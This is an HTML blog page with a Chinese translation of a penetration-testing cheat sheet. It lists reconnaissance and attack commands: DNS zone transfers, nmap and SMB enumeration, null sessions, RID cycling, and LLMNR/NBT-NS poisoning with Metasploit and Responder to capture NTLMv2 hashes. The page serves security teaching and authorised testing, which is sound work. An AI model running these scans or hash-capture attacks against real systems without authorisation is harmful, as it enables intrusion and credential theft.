@@ -1,0 +1,2090 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="渗透测试工具备忘录本文翻译自 Penetration Testing Tools Cheat Sheet  ，首发先知社区 ，转载请注明链接。 简介渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。 本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【译】渗透测试工具备忘录">
+<meta property="og:url" content="https://findneo.github.io/180727PenetrationTool/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="渗透测试工具备忘录本文翻译自 Penetration Testing Tools Cheat Sheet  ，首发先知社区 ，转载请注明链接。 简介渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 本站 其他备忘录。 本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-07-25T07:01:56.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://findneo.github.io/180727PenetrationTool/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【译】渗透测试工具备忘录 | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180727PenetrationTool/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【译】渗透测试工具备忘录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-07-25 15:01:56" itemprop="dateCreated datePublished" datetime="2018-07-25T15:01:56+08:00">2018-07-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="渗透测试工具备忘录"><a href="#渗透测试工具备忘录" class="headerlink" title="渗透测试工具备忘录"></a>渗透测试工具备忘录</h1><p><strong>本文翻译自 <a target="_blank" rel="noopener" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet </a> ，首发<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2446">先知社区</a> ，转载请注明链接。</strong></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 <a target="_blank" rel="noopener" href="https://highon.coffee/blog/">本站</a> 其他备忘录。</p>
+<p>本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。</p>
+<p>文中缺漏之处欢迎 <a target="_blank" rel="noopener" href="https://twitter.com/Arr0way">推特</a> 私戳。</p>
+<h3 id="更新日志："><a href="#更新日志：" class="headerlink" title="更新日志："></a>更新日志：</h3><p>17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。</p>
+<h2 id="开始前"><a href="#开始前" class="headerlink" title="开始前"></a>开始前</h2><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><h4 id="设置IP-地址"><a href="#设置IP-地址" class="headerlink" title="设置IP 地址"></a>设置IP 地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 xxx.xxx.xxx.xxx&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipcalc xxx.xxx.xxx.xxx&#x2F;24 </span><br><span class="line">ipcalc xxx.xxx.xxx.xxx 255.255.255.0 </span><br></pre></td></tr></table></figure>
+
+<h2 id="公开来源情报"><a href="#公开来源情报" class="headerlink" title="公开来源情报"></a>公开来源情报</h2><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><h5 id="WHOIS-枚举"><a href="#WHOIS-枚举" class="headerlink" title="WHOIS 枚举"></a>WHOIS 枚举</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois domain-name-here.com </span><br></pre></td></tr></table></figure>
+
+<h5 id="查询DNS-IP"><a href="#查询DNS-IP" class="headerlink" title="查询DNS IP"></a>查询DNS IP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig a domain-name-here.com @nameserver </span><br></pre></td></tr></table></figure>
+
+<h5 id="查询MX记录"><a href="#查询MX记录" class="headerlink" title="查询MX记录"></a>查询MX记录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig mx domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure>
+
+<h5 id="用DIG-查询域传送"><a href="#用DIG-查询域传送" class="headerlink" title="用DIG 查询域传送"></a>用DIG 查询域传送</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure>
+
+<h2 id="DNS-域传送"><a href="#DNS-域传送" class="headerlink" title="DNS 域传送"></a>DNS 域传送</h2><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></td>
+<td>Windows DNS域传送</td>
+</tr>
+<tr>
+<td><code>dig axfr blah.com @ns1.blah.com</code></td>
+<td>Linux DNS 域传送</td>
+</tr>
+</tbody></table>
+<h3 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h3><h4 id="Simply-Email"><a href="#Simply-Email" class="headerlink" title="Simply Email"></a>Simply Email</h4><p>使用Simply Email枚举所有所有网站（GitHub，目标站点等），配上代理或设置较长的访问间隔时间，这样就不会被Google发现是爬虫并用验证码拦住了。Simply Email还可以验证收集的邮件地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;killswitch-GUI&#x2F;SimplyEmail.git</span><br><span class="line">.&#x2F;SimplyEmail.py -all -e TARGET-DOMAIN</span><br></pre></td></tr></table></figure>
+
+<h3 id="半主动信息收集"><a href="#半主动信息收集" class="headerlink" title="半主动信息收集"></a>半主动信息收集</h3><h4 id="基本指纹识别"><a href="#基本指纹识别" class="headerlink" title="基本指纹识别"></a>基本指纹识别</h4><p>手动指纹识别/banner抓取</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nc -v 192.168.1.1 25</code> <br /><code>telnet 192.168.1.1 25</code></td>
+<td>通过显示banner识别版本和指纹</td>
+</tr>
+</tbody></table>
+<h4 id="使用NC抓取banner"><a href="#使用NC抓取banner" class="headerlink" title="使用NC抓取banner"></a>使用NC抓取banner</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc TARGET-IP 80</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: TARGET-IP</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0</span><br><span class="line">Referrer: meh-domain</span><br><span class="line">&lt;enter&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><h4 id="DNS-爆破"><a href="#DNS-爆破" class="headerlink" title="DNS 爆破"></a>DNS 爆破</h4><h5 id="DNSRecon"><a href="#DNSRecon" class="headerlink" title="DNSRecon"></a>DNSRecon</h5><table>
+<thead>
+<tr>
+<th>DNS Enumeration Kali - DNSRecon</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>root :~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std –xml ouput.xml</td>
+</tr>
+</tbody></table>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="Nmap命令"><a href="#Nmap命令" class="headerlink" title="Nmap命令"></a>Nmap命令</h5><p>更多命令，详见 <a target="_blank" rel="noopener" href="https://highon.coffee/blog/nmap-cheat-sheet/">Nmap备忘录</a> 。</p>
+<p>基本Nmap 命令：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nmap -v -sS -A -T4 target</code></td>
+<td>详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪</td>
+</tr>
+<tr>
+<td><code>nmap -v -sS -p--A -T4 target</code></td>
+<td>同上，且扫描所有TCP端口，耗时更长</td>
+</tr>
+<tr>
+<td><code>nmap -v -sU -sS -p- -A -T4 target</code></td>
+<td>同上，且扫描所有UDP端口，耗时巨长</td>
+</tr>
+<tr>
+<td><code>nmap -v -p 445 --script=smb-check-vulns  --script-args=unsafe=1 192.168.1.X</code></td>
+<td>扫描可能包含漏洞的SMB服务</td>
+</tr>
+<tr>
+<td>` ls /usr/share/nmap/scripts/*</td>
+<td>grep ftp `</td>
+</tr>
+</tbody></table>
+<p>别在外网采用<code>T4</code> 扫描，使用<code>TCP</code> 连接扫描时用<code>T2</code> 比较合适。<code>T4</code> 扫描用在低延迟高带宽的内部网络测试会更合适。但这也取决于目标设备，如果用<code>T4/T5</code> 扫他们，结果就可能不准确。总的来说，扫描越慢越好，也可以先快速扫描1000个目标方便上手测试，然后再慢慢扫其余的。</p>
+<h6 id="Nmap-UDP扫描"><a href="#Nmap-UDP扫描" class="headerlink" title="Nmap UDP扫描"></a>Nmap UDP扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU TARGET </span><br></pre></td></tr></table></figure>
+
+<h6 id="UDP-协议扫描器"><a href="#UDP-协议扫描器" class="headerlink" title="UDP 协议扫描器"></a>UDP 协议扫描器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;portcullislabs&#x2F;udp-proto-scanner.git</span><br></pre></td></tr></table></figure>
+
+<p>扫描文件中IP地址的所有服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;udp-protocol-scanner.pl -f ip.txt </span><br></pre></td></tr></table></figure>
+
+<p>扫描特定UDP服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udp-proto-scanner.pl -p ntp -f ips.txt</span><br></pre></td></tr></table></figure>
+
+<h6 id="其他主机发现"><a href="#其他主机发现" class="headerlink" title="其他主机发现"></a>其他主机发现</h6><p>不使用nmap发现主机的方法：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>netdiscover -r 192.168.1.0/24</code></td>
+<td>利用子网的地址解析协议发现同网段的IP，MAC地址和MAC厂商</td>
+</tr>
+</tbody></table>
+<h2 id="枚举和攻击网络服务"><a href="#枚举和攻击网络服务" class="headerlink" title="枚举和攻击网络服务"></a>枚举和攻击网络服务</h2><p>用于识别/枚举网络服务的工具。</p>
+<h3 id="SAMB-SMB-Windows-域枚举"><a href="#SAMB-SMB-Windows-域枚举" class="headerlink" title="SAMB / SMB / Windows 域枚举"></a>SAMB / SMB / Windows 域枚举</h3><h4 id="Samba枚举"><a href="#Samba枚举" class="headerlink" title="Samba枚举"></a>Samba枚举</h4><h5 id="SMB枚举工具"><a href="#SMB枚举工具" class="headerlink" title="SMB枚举工具"></a>SMB枚举工具</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmblookup -A target</span><br><span class="line">smbclient &#x2F;&#x2F;MOUNT&#x2F;share -I target -N</span><br><span class="line">rpcclient -U &quot;&quot; target</span><br><span class="line">enum4linux target</span><br></pre></td></tr></table></figure>
+
+<p>当然也可参考本站的 <a target="_blank" rel="noopener" href="https://highon.coffee/blog/nbtscan-cheat-sheet/">nbtscan 的速查表</a> </p>
+<h5 id="SMB-版本指纹识别"><a href="#SMB-版本指纹识别" class="headerlink" title="SMB 版本指纹识别"></a>SMB 版本指纹识别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L &#x2F;&#x2F;192.168.1.100 </span><br></pre></td></tr></table></figure>
+
+<h5 id="寻找开放的SMB共享"><a href="#寻找开放的SMB共享" class="headerlink" title="寻找开放的SMB共享"></a>寻找开放的SMB共享</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser&#x3D;username,smbpass&#x3D;password -p445 192.168.1.0&#x2F;24   </span><br></pre></td></tr></table></figure>
+
+<h5 id="枚举SMB用户"><a href="#枚举SMB用户" class="headerlink" title="枚举SMB用户"></a>枚举SMB用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sS --script&#x3D;smb-enum-users -p U:137,T:139 192.168.11.200-254 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &#x2F;usr&#x2F;share&#x2F;doc&#x2F;python-impacket-doc&#x2F;examples&#x2F;samrdump.py 192.168.XXX.XXX</span><br></pre></td></tr></table></figure>
+
+<p>RID循环（RID Cycling ）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</span><br></pre></td></tr></table></figure>
+
+<p>Metasploit的RID循环攻击模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_lookupsid</span><br></pre></td></tr></table></figure>
+
+<h6 id="手动测试空会话"><a href="#手动测试空会话" class="headerlink" title="手动测试空会话"></a>手动测试空会话</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">net use \\TARGET\IPC$ &quot;&quot; &#x2F;u:&quot;&quot;</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">smbclient -L &#x2F;&#x2F;192.168.99.131</span><br></pre></td></tr></table></figure>
+
+<h6 id="NBTScan-unixwiz"><a href="#NBTScan-unixwiz" class="headerlink" title="NBTScan unixwiz"></a>NBTScan unixwiz</h6><p>在Kali上安装使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nbtscan-unixwiz </span><br><span class="line">nbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan</span><br></pre></td></tr></table></figure>
+
+<h4 id="LLMNR-NBT-NS欺骗"><a href="#LLMNR-NBT-NS欺骗" class="headerlink" title="LLMNR / NBT-NS欺骗"></a>LLMNR / NBT-NS欺骗</h4><p>从网络中窃取凭证</p>
+<h5 id="使用Metasploit进行-LLMNR-NetBIOS请求"><a href="#使用Metasploit进行-LLMNR-NetBIOS请求" class="headerlink" title="使用Metasploit进行 LLMNR / NetBIOS请求"></a>使用Metasploit进行 LLMNR / NetBIOS请求</h5><p>欺骗/毒化 LLMNR / NetBIOS请求：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;spoof&#x2F;llmnr&#x2F;llmnr_response</span><br><span class="line">auxiliary&#x2F;spoof&#x2F;nbns&#x2F;nbns_response</span><br></pre></td></tr></table></figure>
+
+<p>抓取哈希</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;server&#x2F;capture&#x2F;smb</span><br><span class="line">auxiliary&#x2F;server&#x2F;capture&#x2F;http_ntlm</span><br></pre></td></tr></table></figure>
+
+<p>最后会得到NTLMv2 哈希，可以使用john或者hashcat破解。</p>
+<h5 id="Responder-py"><a href="#Responder-py" class="headerlink" title="Responder.py"></a>Responder.py</h5><p>你也可以选择使用 responder</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;Responder.git</span><br><span class="line">python Responder.py -i local-ip -I eth0</span><br></pre></td></tr></table></figure>
+
+<p>注：整个渗透测试过程可以一直允许Responder.py</p>
+<h4 id="SNMP枚举工具"><a href="#SNMP枚举工具" class="headerlink" title="SNMP枚举工具"></a>SNMP枚举工具</h4><p>SNMP枚举工具有很多。</p>
+<p>美化SNMP输出结果使易于阅读。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp-mibs-downloader download-mibs</span><br><span class="line">echo &quot;&quot; &gt; &#x2F;etc&#x2F;snmp&#x2F;snmp.conf</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>snmpcheck -t 192.168.1.X -c public</code><br />` snmpwalk -c public -v1 192.168.1.X 1</td>
+<td>grep hrSWRunName</td>
+</tr>
+</tbody></table>
+<h5 id="SNMPv3枚举工具"><a href="#SNMPv3枚举工具" class="headerlink" title="SNMPv3枚举工具"></a>SNMPv3枚举工具</h5><p>使用nmap识别SNMPv3服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 161 --script&#x3D;snmp-info TARGET-SUBNET</span><br></pre></td></tr></table></figure>
+
+<p>Rory McCune 的脚本可以帮助自动化枚举SNMPv3的用户名枚举。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp snmp-mibs-downloader</span><br><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;raesene&#x2F;TestingScripts&#x2F;master&#x2F;snmpv3enum.rb</span><br></pre></td></tr></table></figure>
+
+<p>注意：下面的路径是Kali上Metasploit的SNMP v1和v2的攻击字典，更新的字典可以参考Daniel Miessler <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">在GitHub上的安全列表</a> 。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;snmp_default_pass.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="远程服务枚举"><a href="#远程服务枚举" class="headerlink" title="远程服务枚举"></a>远程服务枚举</h4><p>这已是老生常谈，但为了本文内容的全面还是包含如下。</p>
+<p><code>nmap -A</code> 会进行下面列举的所有远程服务的枚举，所以这里只是顺便提及。</p>
+<h5 id="RSH-枚举"><a href="#RSH-枚举" class="headerlink" title="RSH 枚举"></a>RSH 枚举</h5><h6 id="RSH运行命令"><a href="#RSH运行命令" class="headerlink" title="RSH运行命令"></a>RSH运行命令</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsh &lt;target&gt; &lt;command&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="MetasploitRSH-登陆扫描"><a href="#MetasploitRSH-登陆扫描" class="headerlink" title="MetasploitRSH 登陆扫描"></a>MetasploitRSH 登陆扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;rservices&#x2F;rsh_login</span><br></pre></td></tr></table></figure>
+
+<h6 id="使用rusers显示已登陆用户"><a href="#使用rusers显示已登陆用户" class="headerlink" title="使用rusers显示已登陆用户"></a>使用rusers显示已登陆用户</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rusers -al 192.168.2.1</span><br></pre></td></tr></table></figure>
+
+<h6 id="使用rlogin扫描整个子网"><a href="#使用rlogin扫描整个子网" class="headerlink" title="使用rlogin扫描整个子网"></a>使用rlogin扫描整个子网</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rlogin -l &lt;user&gt; &lt;target&gt;</span><br><span class="line">e.g rlogin -l root TARGET-SUBNET&#x2F;24</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用finger枚举"><a href="#使用finger枚举" class="headerlink" title="使用finger枚举"></a>使用finger枚举</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">finger @TARGET-IP</span><br><span class="line">finger batman@TARGET-IP </span><br></pre></td></tr></table></figure>
+
+<h5 id="利用Solaris的bug显示所有已登录用户"><a href="#利用Solaris的bug显示所有已登录用户" class="headerlink" title="利用Solaris的bug显示所有已登录用户"></a>利用Solaris的bug显示所有已登录用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">finger 0@host  </span><br><span class="line"></span><br><span class="line">SunOS: RPC services allow user enum:</span><br><span class="line">$ rusers # users logged onto LAN</span><br><span class="line"></span><br><span class="line">finger &#39;a b c d e f g h&#39;@sunhost </span><br></pre></td></tr></table></figure>
+
+<h4 id="rwho"><a href="#rwho" class="headerlink" title="rwho"></a>rwho</h4><p>使用nmap识别运行rwhod服务（513端口，UDP协议）的机器。</p>
+<h2 id="TLS-amp-SSL-测试"><a href="#TLS-amp-SSL-测试" class="headerlink" title="TLS&amp;SSL 测试"></a>TLS&amp;SSL 测试</h2><h3 id="testssl-sh"><a href="#testssl-sh" class="headerlink" title="testssl.sh"></a>testssl.sh</h3><p>测试单一主机并将结果输出的HTML文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html  </span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h2><p>在Kali Rolling上安装OpenVAS 8 </p>
